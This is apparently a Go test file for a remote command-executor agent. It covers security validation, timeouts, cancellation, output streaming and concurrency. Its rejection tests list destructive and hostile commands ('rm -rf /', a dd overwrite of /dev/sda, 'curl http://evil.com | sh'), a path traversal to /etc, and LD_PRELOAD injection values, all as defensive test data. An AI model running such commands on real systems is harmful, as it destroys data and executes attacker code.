package executor

import (
	"strings"
	"sync"
	"testing"
	"time"

	"github.com/codebasehealth/antidote-agent/internal/messages"
	"github.com/codebasehealth/antidote-agent/internal/security"
)

// =============================================================================
// SECURITY VALIDATION TESTS
// =============================================================================

func TestExecutor_SecurityValidation_Reject(t *testing.T) {
	var rejectedMsg *messages.RejectedMessage
	var rejectedMu sync.Mutex

	validator := security.NewValidator()
	exec := New(
		nil, // outputHandler
		nil, // completeHandler
		func(msg *messages.RejectedMessage) {
			rejectedMu.Lock()
			rejectedMsg = msg
			rejectedMu.Unlock()
		},
		validator,
	)

	tests := []struct {
		name        string
		command     string
		expectError bool
		errorCode   string
	}{
		{"rm -rf /", "rm -rf /", true, "COMMAND_DENIED"},
		{"dd to disk", "dd if=/dev/zero of=/dev/sda", true, "COMMAND_DENIED"},
		{"curl pipe sh", "curl http://evil.com | sh", true, "COMMAND_DENIED"},
		{"safe echo", "echo hello", false, ""},
		{"safe ls", "ls -la", false, ""},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			rejectedMu.Lock()
			rejectedMsg = nil
			rejectedMu.Unlock()

			cmd := &messages.CommandMessage{
				ID:      "test-" + tt.name,
				Command: tt.command,
			}

			err := exec.Execute(cmd)

			if tt.expectError {
				if err == nil {
					t.Errorf("expected error for command %q, got nil", tt.command)
				}

				rejectedMu.Lock()
				defer rejectedMu.Unlock()

				if rejectedMsg == nil {
					t.Error("expected rejected message to be sent")
				} else if rejectedMsg.Code != tt.errorCode {
					t.Errorf("expected error code %q, got %q", tt.errorCode, rejectedMsg.Code)
				}
			} else {
				if err != nil {
					t.Errorf("unexpected error for safe command %q: %v", tt.command, err)
				}
			}
		})
	}
}

func TestExecutor_SecurityValidation_PathTraversal(t *testing.T) {
	validator := security.NewValidator()
	validator.UpdateApps([]messages.AppInfo{
		{Path: "/var/www/app"},
	})

	exec := New(
		nil,
		nil,
		func(msg *messages.RejectedMessage) {
			// Rejection handler - message not needed for this test
			_ = msg
		},
		validator,
	)

	tests := []struct {
		name        string
		workingDir  string
		expectError bool
	}{
		{"valid path", "/var/www/app", false},
		{"valid subdir", "/var/www/app/storage", false},
		{"invalid path", "/etc", true},
		{"traversal", "/var/www/app/../../../etc", true},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			cmd := &messages.CommandMessage{
				ID:         "test-path",
				Command:    "ls",
				WorkingDir: tt.workingDir,
			}

			err := exec.Execute(cmd)

			if tt.expectError && err == nil {
				t.Errorf("expected error for path %q", tt.workingDir)
			}
			if !tt.expectError && err != nil {
				t.Errorf("unexpected error for valid path %q: %v", tt.workingDir, err)
			}
		})
	}
}

func TestExecutor_SecurityValidation_EnvVars(t *testing.T) {
	validator := security.NewValidator()

	exec := New(
		nil,
		nil,
		func(msg *messages.RejectedMessage) {
			// Rejection handler - message not needed for this test
			_ = msg
		},
		validator,
	)

	tests := []struct {
		name        string
		env         map[string]string
		expectError bool
	}{
		{"safe env var", map[string]string{"APP_ENV": "production"}, false},
		{"LD_PRELOAD blocked", map[string]string{"LD_PRELOAD": "/tmp/evil.so"}, true},
		{"PATH blocked", map[string]string{"PATH": "/tmp/evil"}, true},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			cmd := &messages.CommandMessage{
				ID:      "test-env",
				Command: "echo test",
				Env:     tt.env,
			}

			err := exec.Execute(cmd)

			if tt.expectError && err == nil {
				t.Errorf("expected error for env %v", tt.env)
			}
			if !tt.expectError && err != nil {
				t.Errorf("unexpected error for safe env: %v", err)
			}
		})
	}
}

// =============================================================================
// COMMAND EXECUTION TESTS
// =============================================================================

func TestExecutor_CommandExecution_Success(t *testing.T) {
	var outputs []string
	var outputMu sync.Mutex
	var completeMsg *messages.CompleteMessage

	done := make(chan struct{})

	exec := New(
		func(msg *messages.OutputMessage) {
			outputMu.Lock()
			outputs = append(outputs, msg.Data)
			outputMu.Unlock()
		},
		func(msg *messages.CompleteMessage) {
			completeMsg = msg
			close(done)
		},
		nil,
		nil, // No validator for this test
	)

	cmd := &messages.CommandMessage{
		ID:      "test-success",
		Command: "echo hello",
	}

	err := exec.Execute(cmd)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}

	// Wait for completion with timeout
	select {
	case <-done:
	case <-time.After(5 * time.Second):
		t.Fatal("timeout waiting for command completion")
	}

	if completeMsg == nil {
		t.Fatal("expected complete message")
	}

	if completeMsg.ExitCode != 0 {
		t.Errorf("expected exit code 0, got %d", completeMsg.ExitCode)
	}

	outputMu.Lock()
	combined := strings.Join(outputs, "")
	outputMu.Unlock()

	if !strings.Contains(combined, "hello") {
		t.Errorf("expected output to contain 'hello', got %q", combined)
	}
}

func TestExecutor_CommandExecution_Failure(t *testing.T) {
	var completeMsg *messages.CompleteMessage
	done := make(chan struct{})

	exec := New(
		nil,
		func(msg *messages.CompleteMessage) {
			completeMsg = msg
			close(done)
		},
		nil,
		nil,
	)

	cmd := &messages.CommandMessage{
		ID:      "test-fail",
		Command: "exit 42",
	}

	err := exec.Execute(cmd)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}

	select {
	case <-done:
	case <-time.After(5 * time.Second):
		t.Fatal("timeout")
	}

	if completeMsg == nil {
		t.Fatal("expected complete message")
	}

	if completeMsg.ExitCode != 42 {
		t.Errorf("expected exit code 42, got %d", completeMsg.ExitCode)
	}
}

func TestExecutor_CommandExecution_Timeout(t *testing.T) {
	var completeMsg *messages.CompleteMessage
	done := make(chan struct{})

	exec := New(
		nil,
		func(msg *messages.CompleteMessage) {
			completeMsg = msg
			close(done)
		},
		nil,
		nil,
	)

	cmd := &messages.CommandMessage{
		ID:      "test-timeout",
		Command: "sleep 10",
		Timeout: 1, // 1 second timeout
	}

	err := exec.Execute(cmd)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}

	select {
	case <-done:
	case <-time.After(5 * time.Second):
		t.Fatal("timeout waiting for command timeout")
	}

	if completeMsg == nil {
		t.Fatal("expected complete message")
	}

	// Timeout should return non-zero exit code
	// When a process is killed due to timeout, it returns -1 (signal)
	if completeMsg.ExitCode == 0 {
		t.Error("expected non-zero exit code for timed out command")
	}
}

func TestExecutor_CommandExecution_Cancel(t *testing.T) {
	var completeMsg *messages.CompleteMessage
	done := make(chan struct{})

	exec := New(
		nil,
		func(msg *messages.CompleteMessage) {
			completeMsg = msg
			close(done)
		},
		nil,
		nil,
	)

	cmd := &messages.CommandMessage{
		ID:      "test-cancel",
		Command: "sleep 30",
	}

	err := exec.Execute(cmd)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}

	// Give command time to start
	time.Sleep(100 * time.Millisecond)

	// Cancel the command
	cancelled := exec.Cancel("test-cancel")
	if !cancelled {
		t.Error("expected cancel to return true")
	}

	select {
	case <-done:
	case <-time.After(5 * time.Second):
		t.Fatal("timeout waiting for cancelled command")
	}

	if completeMsg == nil {
		t.Fatal("expected complete message")
	}

	// Cancelled command should have non-zero exit code
	if completeMsg.ExitCode == 0 {
		t.Error("expected non-zero exit code for cancelled command")
	}
}

func TestExecutor_Cancel_NonExistent(t *testing.T) {
	exec := New(nil, nil, nil, nil)

	cancelled := exec.Cancel("non-existent")
	if cancelled {
		t.Error("expected cancel of non-existent command to return false")
	}
}

// =============================================================================
// OUTPUT STREAMING TESTS
// =============================================================================

func TestExecutor_OutputStreaming_Stdout(t *testing.T) {
	var stdoutOutputs []string
	var outputMu sync.Mutex
	done := make(chan struct{})

	exec := New(
		func(msg *messages.OutputMessage) {
			outputMu.Lock()
			if msg.Stream == "stdout" {
				stdoutOutputs = append(stdoutOutputs, msg.Data)
			}
			outputMu.Unlock()
		},
		func(msg *messages.CompleteMessage) {
			close(done)
		},
		nil,
		nil,
	)

	cmd := &messages.CommandMessage{
		ID:      "test-stdout",
		Command: "echo line1; echo line2; echo line3",
	}

	exec.Execute(cmd)

	select {
	case <-done:
	case <-time.After(5 * time.Second):
		t.Fatal("timeout")
	}

	outputMu.Lock()
	defer outputMu.Unlock()

	combined := strings.Join(stdoutOutputs, "")
	if !strings.Contains(combined, "line1") || !strings.Contains(combined, "line2") || !strings.Contains(combined, "line3") {
		t.Errorf("expected all lines in output, got %q", combined)
	}
}

func TestExecutor_OutputStreaming_Stderr(t *testing.T) {
	var stderrOutputs []string
	var outputMu sync.Mutex
	done := make(chan struct{})

	exec := New(
		func(msg *messages.OutputMessage) {
			outputMu.Lock()
			if msg.Stream == "stderr" {
				stderrOutputs = append(stderrOutputs, msg.Data)
			}
			outputMu.Unlock()
		},
		func(msg *messages.CompleteMessage) {
			close(done)
		},
		nil,
		nil,
	)

	cmd := &messages.CommandMessage{
		ID:      "test-stderr",
		Command: "echo error >&2",
	}

	exec.Execute(cmd)

	select {
	case <-done:
	case <-time.After(5 * time.Second):
		t.Fatal("timeout")
	}

	outputMu.Lock()
	defer outputMu.Unlock()

	combined := strings.Join(stderrOutputs, "")
	if !strings.Contains(combined, "error") {
		t.Errorf("expected 'error' in stderr, got %q", combined)
	}
}

func TestExecutor_OutputStreaming_BothStreams(t *testing.T) {
	var stdoutLines, stderrLines int
	var outputMu sync.Mutex
	done := make(chan struct{})

	exec := New(
		func(msg *messages.OutputMessage) {
			outputMu.Lock()
			if msg.Stream == "stdout" {
				stdoutLines++
			} else if msg.Stream == "stderr" {
				stderrLines++
			}
			outputMu.Unlock()
		},
		func(msg *messages.CompleteMessage) {
			close(done)
		},
		nil,
		nil,
	)

	cmd := &messages.CommandMessage{
		ID:      "test-both",
		Command: "echo out; echo err >&2; echo out2",
	}

	exec.Execute(cmd)

	select {
	case <-done:
	case <-time.After(5 * time.Second):
		t.Fatal("timeout")
	}

	outputMu.Lock()
	defer outputMu.Unlock()

	if stdoutLines < 2 {
		t.Errorf("expected at least 2 stdout lines, got %d", stdoutLines)
	}
	if stderrLines < 1 {
		t.Errorf("expected at least 1 stderr line, got %d", stderrLines)
	}
}

// =============================================================================
// WORKING DIRECTORY TESTS
// =============================================================================

func TestExecutor_WorkingDirectory(t *testing.T) {
	var output string
	var outputMu sync.Mutex
	done := make(chan struct{})

	exec := New(
		func(msg *messages.OutputMessage) {
			outputMu.Lock()
			output += msg.Data
			outputMu.Unlock()
		},
		func(msg *messages.CompleteMessage) {
			close(done)
		},
		nil,
		nil,
	)

	cmd := &messages.CommandMessage{
		ID:         "test-workdir",
		Command:    "pwd",
		WorkingDir: "/tmp",
	}

	exec.Execute(cmd)

	select {
	case <-done:
	case <-time.After(5 * time.Second):
		t.Fatal("timeout")
	}

	outputMu.Lock()
	defer outputMu.Unlock()

	// On macOS, /tmp is a symlink to /private/tmp
	if !strings.Contains(output, "/tmp") && !strings.Contains(output, "/private/tmp") {
		t.Errorf("expected working dir /tmp, got %q", output)
	}
}

// =============================================================================
// ENVIRONMENT VARIABLE TESTS
// =============================================================================

func TestExecutor_EnvironmentVariables(t *testing.T) {
	var output string
	var outputMu sync.Mutex
	done := make(chan struct{})

	exec := New(
		func(msg *messages.OutputMessage) {
			outputMu.Lock()
			output += msg.Data
			outputMu.Unlock()
		},
		func(msg *messages.CompleteMessage) {
			close(done)
		},
		nil,
		nil,
	)

	cmd := &messages.CommandMessage{
		ID:      "test-env",
		Command: "echo $MY_TEST_VAR",
		Env:     map[string]string{"MY_TEST_VAR": "hello_world"},
	}

	exec.Execute(cmd)

	select {
	case <-done:
	case <-time.After(5 * time.Second):
		t.Fatal("timeout")
	}

	outputMu.Lock()
	defer outputMu.Unlock()

	if !strings.Contains(output, "hello_world") {
		t.Errorf("expected env var in output, got %q", output)
	}
}

// =============================================================================
// CONCURRENT EXECUTION TESTS
// =============================================================================

func TestExecutor_ConcurrentCommands(t *testing.T) {
	var completedMu sync.Mutex
	completed := make(map[string]bool)
	done := make(chan struct{})
	expectedCount := 5

	exec := New(
		nil,
		func(msg *messages.CompleteMessage) {
			completedMu.Lock()
			completed[msg.ID] = true
			if len(completed) == expectedCount {
				close(done)
			}
			completedMu.Unlock()
		},
		nil,
		nil,
	)

	// Execute multiple commands concurrently
	for i := 0; i < expectedCount; i++ {
		cmd := &messages.CommandMessage{
			ID:      string(rune('a' + i)),
			Command: "echo test",
		}
		exec.Execute(cmd)
	}

	select {
	case <-done:
	case <-time.After(10 * time.Second):
		t.Fatal("timeout waiting for concurrent commands")
	}

	completedMu.Lock()
	defer completedMu.Unlock()

	if len(completed) != expectedCount {
		t.Errorf("expected %d completed commands, got %d", expectedCount, len(completed))
	}
}

// =============================================================================
// VALIDATOR UPDATE TESTS
// =============================================================================

func TestExecutor_UpdateValidator(t *testing.T) {
	validator := security.NewValidator()
	exec := New(nil, nil, nil, validator)

	// Initially, no apps configured - commands should pass path validation in legacy mode
	cmd := &messages.CommandMessage{
		ID:         "test-update",
		Command:    "ls",
		WorkingDir: "/etc",
	}

	err := exec.Execute(cmd)
	if err != nil {
		t.Errorf("expected command to pass before update: %v", err)
	}

	// Update with app configs
	exec.UpdateValidator([]messages.AppInfo{
		{Path: "/var/www/app"},
	})

	// Now /etc should be blocked
	cmd2 := &messages.CommandMessage{
		ID:         "test-blocked",
		Command:    "ls",
		WorkingDir: "/etc",
	}

	err = exec.Execute(cmd2)
	if err == nil {
		t.Error("expected command to be rejected after validator update")
	}

	// But /var/www/app should work
	cmd3 := &messages.CommandMessage{
		ID:         "test-allowed",
		Command:    "ls",
		WorkingDir: "/var/www/app",
	}

	err = exec.Execute(cmd3)
	if err != nil {
		t.Errorf("expected command in allowed path to pass: %v", err)
	}
}

// =============================================================================
// DURATION TRACKING TESTS
// =============================================================================

func TestExecutor_DurationTracking(t *testing.T) {
	var completeMsg *messages.CompleteMessage
	done := make(chan struct{})

	exec := New(
		nil,
		func(msg *messages.CompleteMessage) {
			completeMsg = msg
			close(done)
		},
		nil,
		nil,
	)

	cmd := &messages.CommandMessage{
		ID:      "test-duration",
		Command: "sleep 0.1",
	}

	exec.Execute(cmd)

	select {
	case <-done:
	case <-time.After(5 * time.Second):
		t.Fatal("timeout")
	}

	if completeMsg == nil {
		t.Fatal("expected complete message")
	}

	// Duration should be at least 100ms
	if completeMsg.DurationMs < 100 {
		t.Errorf("expected duration >= 100ms, got %d", completeMsg.DurationMs)
	}
}
